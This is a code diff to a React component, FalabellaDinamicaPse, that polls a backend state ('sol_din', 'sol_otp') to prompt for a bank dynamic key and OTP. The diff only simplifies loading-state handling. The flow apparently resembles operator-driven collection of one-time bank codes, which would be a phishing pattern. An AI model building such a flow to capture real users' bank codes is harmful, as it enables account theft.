@@ -316,22 +316,10 @@ const FalabellaDinamicaPse = () => {
 
       switch (estadoActual) {
         case "sol_din":
-          if (esperandoRespuestaTrasEnviarRef.current) {
-            if (!dinTrasEnviarVioPendienteRef.current) {
-              break;
-            }
-            dinTrasEnviarVioPendienteRef.current = false;
-            esperandoRespuestaTrasEnviarRef.current = false;
-            setIsLoading(false);
-            setDynamicKey("");
-            initPolling();
+          if (esperandoRespuestaTrasEnviarRef.current || envioDinamicaEnCursoRef.current) {
             break;
           }
-          // Mientras el POST /falabella/dinamica está en vuelo, esperando aún es false: sin esta
-          // guarda el poll en "sol_din" quita el loading antes de que termine el envío.
-          if (!envioDinamicaEnCursoRef.current) {
-            setIsLoading(false);
-          }
+          setIsLoading(false);
           break;
         case "sol_otp":
           esperandoRespuestaTrasEnviarRef.current = false;
